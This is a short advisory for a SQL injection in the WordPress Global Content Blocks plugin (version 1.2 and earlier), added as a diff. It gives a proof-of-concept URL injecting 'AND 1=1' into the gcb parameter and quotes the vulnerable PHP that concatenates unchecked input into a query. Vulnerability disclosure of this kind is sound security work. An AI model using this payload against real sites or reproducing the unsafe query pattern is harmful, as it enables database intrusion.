@@ -1,0 +1,28 @@
+# Exploit Title: WordPress Global Content Blocks plugin <= 1.2 SQL Injection Vulnerability
+# Date: 2011-08-18
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/global-content-blocks.1.2.zip
+# Version: 1.2 (tested)
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/global-content-blocks/gcb/gcb_export.php?gcb=1 AND 1=1
+
+---------------
+Vulnerable code
+---------------
+$ids = explode(";",$_GET["gcb"]);
+$final_text = array();
+
+foreach($ids as $id) {
+    if(intval($id)>0) { // intval("1a") => 1 :)
+        $entry = $wpdb->get_row("select * from ".$wpdb->prefix."gcb where id=".$id);
+        $final_text[] =
+        base64_encode($entry->name)."<;>".
+        base64_encode($entry->description)."<;>".
+        base64_encode($entry->value)."<;>".
+        base64_encode($entry->type);        
+    }
+}
+
